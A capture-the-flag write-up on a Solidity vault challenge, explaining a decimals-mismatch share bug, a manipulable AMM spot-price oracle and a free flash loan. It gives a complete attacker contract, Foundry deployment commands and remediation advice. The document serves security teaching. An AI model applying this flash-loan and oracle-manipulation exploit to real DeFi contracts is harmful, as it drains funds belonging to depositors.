
# Caldrin's Day Away — Writeup
**Author:** Mohammed Ali  

**Category:** Smart Contract Exploitation
**Difficulty:** Easy
**Points:** 1000

## Challenge Summary

The scenario wraps a DeFi-style vault system in a "dockside trading" theme. Players are given a set of Solidity contracts:

- `TradeToken.sol` — a minimal ERC20-style token (`crownCoin`)
- `DocksideMarket.sol` — a constant-product AMM trading `crownCoin` against `saltGoods`
- `GoldhandCredit.sol` — a single-transaction "flash loan" facility for `crownCoin`
- `PublicStampDesk.sol` — a whitelisting proxy that lets pre-approved calldata be executed via `staticcall`
- `DocksideSharehouse.sol` — an ERC4626-like vault: users deposit `crownCoin` and receive `claimMarks` representing a share of the vault
- `Setup.sol` — deploys and wires everything together, and defines the win condition

**Goal:** drain the Sharehouse's `crownCoin` balance below `SOLVE_THRESHOLD` (150,000e6).

```solidity
function isSolved() external view returns (bool) {
    return crownCoin.balanceOf(address(sharehouse)) < SOLVE_THRESHOLD;
}
```

## Vulnerability Analysis

Three separate design flaws chain together into a full exploit.

### 1. Decimals mismatch in share minting

`DocksideSharehouse.leaveGoods()` mints `claimMarks` proportional to the deposit:

```solidity
if (totalClaimMarks == 0) {
    claimMarkAmount = crownCoinAmount * 1e12;
} else {
    claimMarkAmount = (crownCoinAmount * totalClaimMarks) / recordedHoldings;
}
```

`crownCoin` uses **6 decimals**, but the Sharehouse's initial `claimMarks` supply is seeded in **18-decimal ("ether") units**:

```solidity
uint256 public constant SAILOR_CLAIM_MARKS = 990_000 ether; // 990,000 * 1e18
uint256 public constant SHAREHOUSE_HOLDINGS = 1_000_000e6;  // 1,000,000 * 1e6
```

Because `totalClaimMarks` (1e18-scale) is divided by `recordedHoldings` (1e6-scale), every unit of `crownCoin` deposited mints roughly `1e12` times too many claim marks. A small deposit buys a disproportionately large share of the vault.

### 2. Manipulable, permissionlessly-triggerable price oracle

`recountHoldings()` lets *anyone* refresh the vault's recorded holdings using data read through `PublicStampDesk`:

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);
    uint256 newHoldings = abi.decode(result, (uint256));
    recordedHoldings = newHoldings;
}
```

There's no access control on *calling* `recountHoldings()` — only on which `stampedOrder` is pre-approved in `PublicStampDesk`. In `Setup`, the only approved order points at:

```solidity
DocksideMarket.valueCargoAsOneGood(SHAREHOUSE_CARGO_POSITION, 0)
```

which simply returns the AMM's **live, spot** `crownReserve` — a value any user can move by trading against the pool. This makes `recordedHoldings` (and therefore the vault's share price) directly manipulable within a single transaction.

### 3. Zero-cost, single-transaction flash loan

`GoldhandCredit.borrowForOneCall()` lends out its entire `crownCoin` balance for the duration of one call, with no fee, gated only by a post-call balance check:

```solidity
function borrowForOneCall(uint256 amount, bytes calldata data) external {
    require(activeBorrower == address(0), "LOAN_ACTIVE");
    uint256 balanceBefore = coin.balanceOf(address(this));
    require(amount <= balanceBefore, "NOT_ENOUGH_COIN");
    require(coin.transfer(msg.sender, amount), "LOAN_FAILED");
    activeBorrower = msg.sender;
    IQuayBorrower(msg.sender).onQuayLoan(amount, data);
    activeBorrower = address(0);
    require(coin.balanceOf(address(this)) >= balanceBefore, "DEBT_NOT_RETURNED");
}
```

This provides the capital needed to move the AMM price meaningfully, at zero cost as long as it's repaid by the end of the call.

## Exploit Chain

1. Call `Setup.takeTravelPurse()` to receive a small amount of `crownCoin` and matching travel-purse credit.
2. Deposit that `crownCoin` into the Sharehouse via `leaveGoods()`. Due to the decimals bug, this mints a vastly inflated `claimMarks` balance relative to the tiny deposit.
3. Borrow the entire `crownCoin` balance of `GoldhandCredit` via `borrowForOneCall()`.
4. Inside the `onQuayLoan()` callback:
   a. Swap the borrowed `crownCoin` into `saltGoods` on `DocksideMarket`, which pumps `crownReserve` up.
   b. Call `sharehouse.recountHoldings()` with the pre-approved stamped order — this reads the now-inflated `crownReserve` and sets `recordedHoldings` to match.
   c. Call `redeemClaim()` with the attacker's inflated `claimMarks` balance. Because `recordedHoldings` is now artificially high, this pays out far more `crownCoin` than was ever legitimately deposited — draining the Sharehouse.
   d. Reverse the earlier swap (`saltGoods` → `crownCoin`) to recover enough `crownCoin` to repay the flash loan.
5. Repay `GoldhandCredit` in full, keep the profit.

Net effect: the Sharehouse's `crownCoin` balance drops from 1,000,000e6 down under the 150,000e6 threshold in a single atomic transaction, satisfying `isSolved()`.

## Proof of Concept

`Attacker.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IQuayBorrower.sol";
import "./TradeToken.sol";
import "./DocksideMarket.sol";
import "./GoldhandCredit.sol";
import "./DocksideSharehouse.sol";
import "./Setup.sol";

contract Attacker is IQuayBorrower {
    Setup public immutable setup;
    TradeToken public immutable crownCoin;
    DocksideMarket public immutable market;
    GoldhandCredit public immutable credit;
    DocksideSharehouse public immutable sharehouse;

    constructor(address _setup) {
        setup = Setup(_setup);
        crownCoin = setup.crownCoin();
        market = setup.quayMarket();
        credit = setup.goldhandCredit();
        sharehouse = setup.sharehouse();
    }

    function attack() external {
        // 1. Grab the travel purse credit + free CROWN
        setup.takeTravelPurse();
        uint256 purse = crownCoin.balanceOf(address(this));

        // 2. Deposit into the Sharehouse -> mints wildly inflated claim marks
        //    due to the 18-decimal / 6-decimal mismatch
        crownCoin.approve(address(sharehouse), purse);
        sharehouse.leaveGoods(purse);

        // 3. Flash loan the max available CROWN and do the manipulation
        uint256 loanAmount = crownCoin.balanceOf(address(credit));
        credit.borrowForOneCall(loanAmount, "");

        // 4. Send everything back to the caller
        crownCoin.transfer(msg.sender, crownCoin.balanceOf(address(this)));
    }

    function onQuayLoan(uint256 amount, bytes calldata) external override {
        require(msg.sender == address(credit), "not credit");

        // Pump crownReserve in the market
        crownCoin.approve(address(market), amount);
        market.trade(0, 1, amount, 0);

        // Push the manipulated price into the Sharehouse via the
        // pre-approved public stamped order
        sharehouse.recountHoldings(setup.buildPublicRecountOrder());

        // Redeem our inflated claim marks at the fake high price
        uint256 myClaims = sharehouse.claimMarks(address(this));
        sharehouse.redeemClaim(myClaims);

        // Reverse the trade to recover CROWN and repay the loan
        TradeToken salt = market.saltGoods();
        uint256 saltBal = salt.balanceOf(address(this));
        salt.approve(address(market), saltBal);
        market.trade(1, 0, saltBal, 0);

        crownCoin.transfer(address(credit), amount);
    }
}
```

### Reproduction Steps

1. **Set up a Foundry project and copy in the challenge contracts + `Attacker.sol`:**

   ```bash
   forge init --force
   rm -rf src/* test/* script/*
   cp /path/to/challenge/*.sol src/
   # add Attacker.sol (above) to src/
   forge build
   ```

2. **Get instance connection details** from the challenge's connection menu (RPC URL, funded wallet private key, `Setup` contract address), and export them:

   ```bash
   export RPC_URL=<instance RPC URL>
   export PRIVATE_KEY=<funded private key>
   export SETUP=<Setup contract address>
   ```

3. **Sanity-check the connection:**

   ```bash
   cast chain-id --rpc-url $RPC_URL
   cast balance $PRIVATE_KEY_WALLET_ADDRESS --rpc-url $RPC_URL
   cast call $SETUP "isSolved()(bool)" --rpc-url $RPC_URL   # expect: false
   ```

4. **Deploy the attacker contract.** Note: `--broadcast` must come *before* `--constructor-args`, otherwise `forge create` treats it as a dry run.

   ```bash
   forge create src/Attacker.sol:Attacker \
     --rpc-url $RPC_URL --private-key $PRIVATE_KEY \
     --broadcast \
     --constructor-args $SETUP
   ```

   ```bash
   export ATTACKER=<Deployed to address>
   ```

5. **Execute the exploit:**

   ```bash
   cast send $ATTACKER "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
   ```

6. **Confirm the solve:**

   ```bash
   cast call $SETUP "isSolved()(bool)" --rpc-url $RPC_URL   # expect: true
   ```

7. Retrieve the flag through the challenge's connection menu ("Get flag" option).

## Root Cause & Remediation

| Flaw | Fix |
|---|---|
| Decimals mismatch between `claimMarks` (18d) and `crownCoin`/`recordedHoldings` (6d) | Use consistent decimal scaling for shares vs. underlying asset, or normalize explicitly in the share-price math (as OpenZeppelin's ERC4626 does with its decimals-offset virtual shares/assets). |
| `recordedHoldings` derived from a live, single-block AMM spot price | Never treat a spot AMM reserve as a trusted price oracle. Use a TWAP, an external oracle (e.g. Chainlink), or restrict `recountHoldings()`/its approved orders to a trusted keeper with sanity bounds. |
| Free, uncapped single-transaction flash loan | Not inherently a bug, but combined with a manipulable oracle it becomes the capital source for the attack — the fix is upstream (secure the oracle), since flash loans are a standard, legitimate primitive. |

## Key Takeaway

This challenge is a compact illustration of the classic **flash-loan + oracle manipulation** pattern seen in real-world DeFi exploits: an attacker uses a free flash loan to temporarily distort a price source that a vault trusts, then exploits that distorted price (compounded here by a decimals bug) to redeem far more value than was ever deposited — all atomically, with the flash loan repaid before the transaction ends.

### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon
